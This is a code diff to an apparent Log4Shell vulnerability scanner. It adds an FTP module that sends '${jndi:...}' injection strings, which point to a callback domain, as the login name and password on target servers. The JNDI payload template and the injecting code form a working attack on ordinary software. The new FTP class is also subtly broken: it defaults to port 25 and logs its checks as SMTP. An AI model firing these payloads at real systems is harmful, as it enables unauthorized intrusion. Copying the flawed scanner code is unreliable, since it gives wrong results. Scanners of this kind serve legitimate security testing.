@@ -9,6 +9,7 @@ from enum import Enum
 from smtplib import SMTP
 from urllib.parse import urlparse
 from queue import Queue
+from ftplib import FTP
 
 import httpx
 from imap_tools import MailBox
@@ -92,7 +93,7 @@ class BaseScanner:
         format_str = "${{{jndi}:{protocol}://{bypass}{target_callback}/{path}}}"
 
         if include_domain:
-            target = f"{test_domain}.{callback_url}"
+            target = f"{test_domain.replace(':', '_')}.{callback_url}"
         else:
             target = callback_url
         return format_str.format(
@@ -407,6 +408,38 @@ class SmtpScanner(BaseScanner):
                         smtp.sendmail(f"{smtplib.quoteaddr(payload)}@test.com", f"{smtplib.quoteaddr(payload)}@{hostname}", smtplib.quotedata(payload))
                 except Exception as e:
                     logging.debug(e)
+
+
+class FtpScanner(BaseScanner):
+
+    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool, path_to_clientcert: str = None) -> None:
+        super().__init__(targets, obfuscate_payloads, request_path, include_bypass, path_to_clientcert=path_to_clientcert)
+
+    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
+        while self.targets.qsize() != 0:
+            target = self.targets.get()
+            if ":" in target:
+                hostname, port = target.split(':')
+            else:
+                hostname = target
+                port = 25
+            logging.info(f"Checking {hostname} on port {port} over SMTP.")
+            for protocol in PAYLOAD_PROTOCOLS:
+                payload = self.create_payload(
+                    callback_domain, protocol,
+                    self.get_request_path(use_random_request_path),
+                    target,
+                    is_domain_in_callback,
+                    self.include_bypass
+                )
+                ftp = FTP(host=hostname)
+                try:
+                    ftp.connect(port=port)
+                    ftp.login(user=payload, passwd=payload)
+                except Exception as e:
+                    logging.debug(e)
+                finally:
+                    ftp.close()
 
 
 class RawSocketScanner(BaseScanner):
